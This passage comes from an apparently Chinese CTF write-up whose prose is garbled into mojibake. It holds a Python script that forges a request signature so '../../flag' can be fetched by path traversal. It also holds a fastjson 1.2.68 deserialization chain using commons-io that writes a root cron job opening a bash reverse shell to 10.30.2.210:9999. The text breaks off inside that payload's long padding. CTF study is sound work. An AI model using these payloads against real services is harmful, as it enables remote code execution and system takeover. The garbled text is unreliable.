class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>file<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.value<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.metadata<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPArgumentPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sign<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>sign<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.value<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;sign&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.metadata<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>collectionProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.domain<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>localhost<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.port<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>8080<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.protocol<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>http<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.contentEncoding<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.path<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>/download<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.method<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>GET<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.follow_redirects<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.auto_redirects<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.use_keepalive<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.DO_MULTIPART_POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.body_data<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.bypass_proxy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.proxy_host<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.proxy_port<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.proxy_username<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.proxy_password<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.implementation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>HttpClient4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HTTPSamplerProxy</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hashTree</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hashTree</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hashTree</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jmeterTestPlan</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­çš„ hashTree éƒ¨åˆ†æ˜¯ç­¾åçš„ç®—æ³•ï¼Œsalt æ˜¯ <code>f9bc855c9df15ba7602945fb939deefc</code></p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token keyword">def</span> mingWen <span class="token operator">=</span> vars<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'mingWen'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">def</span> firstMi <span class="token operator">=</span> DigestUtils<span class="token punctuation">.</span><span class="token function">md5Hex</span><span class="token punctuation">(</span>mingWen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">def</span> jieStr <span class="token operator">=</span> firstMi<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">def</span> salt <span class="token operator">=</span> vars<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'salt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">def</span> newStr <span class="token operator">=</span> firstMi <span class="token operator">+</span> jieStr <span class="token operator">+</span> salt<span class="token punctuation">;</span><span class="token keyword">def</span> sign <span class="token operator">=</span> DigestUtils<span class="token punctuation">.</span><span class="token function">md5Hex</span><span class="token punctuation">(</span>newStr<span class="token punctuation">)</span><span class="token punctuation">;</span>vars<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">'sign'</span><span class="token punctuation">,</span> sign<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®é™…ä¸Šæ˜¯åŸå§‹ md5 åŠ ä¸Š md5 åæˆªå–ä¸€éƒ¨åˆ†åˆåŠ ä¸Šç›å€¼åå†æ¬¡ md5</p><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib  <span class="token keyword">def</span> calculate_sign<span class="token punctuation">(</span>mingWen<span class="token punctuation">)</span><span class="token punctuation">:</span>      firstMi <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>mingWen<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>      jieStr <span class="token operator">=</span> firstMi<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>    salt <span class="token operator">=</span> <span class="token string">"f9bc855c9df15ba7602945fb939deefc"</span>    newStr <span class="token operator">=</span> firstMi <span class="token operator">+</span> jieStr <span class="token operator">+</span> salt       sign <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>newStr<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> sign<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç­¾å ..&#x2F;..&#x2F;flag ä¼ å‚å³å¯</p><hr><h2 id="Sunsetï¼ˆå¤ç°ï¼‰"><a href="#Sunsetï¼ˆå¤ç°ï¼‰" class="headerlink" title="Sunsetï¼ˆå¤ç°ï¼‰"></a>Sunsetï¼ˆå¤ç°ï¼‰</h2><p>ä¸€ä¸ª java æœåŠ¡</p><p><code>admin:123456</code> ç™»å½•</p><p>æ¥åˆ°é‡ç½®å¯†ç å¤„ï¼ŒæŠ“åŒ…å‘ç°ä¼ å…¥çš„æ˜¯ jsonï¼Œå°è¯•æ¢æµ‹</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span>a<span class="token punctuation">[</span><span class="token property">"test"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿”å›</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"timestamp"</span><span class="token operator">:</span><span class="token string">"2025-12-06T07:44:10.100+0000"</span><span class="token punctuation">,</span><span class="token property">"status"</span><span class="token operator">:</span><span class="token number">500</span><span class="token punctuation">,</span><span class="token property">"error"</span><span class="token operator">:</span><span class="token string">"Internal Server Error"</span><span class="token punctuation">,</span><span class="token property">"message"</span><span class="token operator">:</span><span class="token string">"syntax error, expect &#123;, actual error, pos 36, fastjson-version 1.2.68"</span><span class="token punctuation">,</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token string">"/admin/resetPassword"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¦æ‰“ fastjson 1.2.68 ååºåˆ—åŒ–</p><p>æ¢æµ‹ä¸€ä¸‹åŒ…ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"x"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Character"</span><span class="token punctuation">&#123;</span>  <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>  <span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"org.apache.commons.io.Charsets"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿”å› </p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"timestamp"</span><span class="token operator">:</span> <span class="token string">"2026-01-08T06:53:37.910+0000"</span><span class="token punctuation">,</span>  <span class="token property">"status"</span><span class="token operator">:</span> <span class="token number">500</span><span class="token punctuation">,</span>  <span class="token property">"error"</span><span class="token operator">:</span> <span class="token string">"Internal Server Error"</span><span class="token punctuation">,</span>  <span class="token property">"message"</span><span class="token operator">:</span> <span class="token string">"can not cast to char, value : class org.apache.commons.io.Charsets"</span><span class="token punctuation">,</span>  <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"/admin/resetPassword"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å­˜åœ¨ commons-io</p><p>å¯ä»¥ç›´æ¥å†™è®¡åˆ’ä»»åŠ¡åå¼¹ shell</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"x"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.alibaba.fastjson.JSONObject"</span><span class="token punctuation">,</span>    <span class="token property">"input"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.ReaderInputStream"</span><span class="token punctuation">,</span>      <span class="token property">"reader"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.CharSequenceReader"</span><span class="token punctuation">,</span>        <span class="token property">"charSequence"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.String"</span>"* * * * * root bash -c 'bash -i >&amp; /dev/tcp/<span class="token number">10.30</span>.<span class="token number">2.210</span>/<span class="token number">9999</span> <span class="token number">0</span>>&amp;<span class="token number">1</span>' #aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa